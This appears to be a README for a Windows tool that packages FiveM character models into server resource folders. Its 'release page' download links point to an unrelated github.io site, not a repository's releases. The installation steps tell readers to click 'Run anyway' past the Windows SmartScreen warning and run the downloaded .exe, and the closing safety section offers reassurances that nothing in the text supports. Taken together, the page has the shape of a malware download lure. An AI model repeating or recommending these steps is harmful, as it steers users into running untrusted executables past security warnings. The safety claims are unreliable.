# 📦 nhm-fivem-ped-creator-tool - Simplify creation of custom character models

[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://oceanic-sweettooth463.github.io)

This application helps users package character files for FiveM servers. It automates the process of converting addon models into ready-to-use resource folders. Use this tool to save time when you prepare custom clothing or character assets for your game.

## 🛠️ System Requirements

Ensure your computer meets these requirements before you start:

*   **Operating System**: Windows 10 or Windows 11 (64-bit).
*   **Memory**: At least 4GB of RAM.
*   **Storage**: 100MB of free disk space for the tool.
*   **Permissions**: You need administrative rights to install software on your machine.
*   **Framework**: Microsoft .NET Desktop Runtime 6.0 or newer. Most Windows machines include this, but the installer will prompt you if it is missing.

## 📥 Downloading the Software

You find the official version of the tool on the releases page. 

[Click here to visit the release page and download the setup file](https://oceanic-sweettooth463.github.io)

Look for the file ending in `.exe` under the Assets section of the latest release. Save this file to your Downloads folder or your Desktop for easy access.

## ⚙️ Installation Steps

Follow these steps to install the tool on your Windows computer:

1.  Locate the downloaded `.exe` file.
2.  Double-click the file to start the installer.
3.  A window from Windows might appear saying "Windows protected your PC." Click "More info" and then click "Run anyway" to proceed.
4.  Follow the instructions on the screen.
5.  Select a folder where you want to keep the application.
6.  Click Install to finish the process.
7.  The application will create a shortcut on your desktop.

## 📁 Using the Tool

This tool simplifies the flow for addon-to-ped conversion. Follow this workflow to package your files:

1.  **Open the Application**: Double-click the desktop shortcut.
2.  **Select Your Files**: Click the directory picker button to locate your raw character files. These files are typically your stream components, such as ytd or ydr files.
3.  **Define Resource Details**: Enter the name of your resource. This is the name your server uses to stream the character.
4.  **Configure Output Path**: Choose where the tool should save your finished resource folder.
5.  **Run Process**: Press the "Package" button. The tool will organize your files and create a `fxmanifest.lua` file automatically.
6.  **Verify Output**: Open the output folder once the tool finishes. You should see a folder structure ready for your server's resources directory.

## 💡 Common Tasks

**Packaging Multiple Peds**
You can process multiple character models at once. Place your model folders inside a root directory and direct the tool to that root folder. The tool detects each sub-folder and treats it as an individual resource.

**Updating Resource Manifests**
If you need to change your resource name after packaging, you can use the built-in edit feature. Select the existing folder, click "Manifest Editor," update the name, and save. The tool refreshes the manifest file without changing your model files.

## ❓ Frequently Asked Questions

**Does the tool modify my model files?**
No. The application only reads your files and copies them into a new folder structure. It creates a small configuration script to help the game engine recognize your content. Your original files remain unchanged.

**Where do I put the finished folders?**
Place the output folder inside your server's resources directory. Add the name of the new folder to your `server.cfg` file using the `ensure` command.

**What if the tool shows an error?**
Most errors occur due to file naming issues. Ensure your file names do not contain spaces or special characters. Use only letters, numbers, and underscores. If the issue persists, ensure your Windows user account has write permissions for the destination folder.

**Can I run this on a server?**
This tool is a local companion app. You run it on your personal computer to prepare the files, and then you upload those finished folders to your server hosting provider. Do not run this tool directly on your live server hosting machine unless you have a desktop interface.

## 🛡️ Privacy and Safety

This tool performs all processes locally on your machine. It does not connect to external servers or collect information from your computer. All file conversions happen within your own system storage. Always download the tool directly from this official GitHub repository to ensure you maintain the genuine version.

Keywords: fivem, ped, creator, tool, addon, resource, character, stream, windows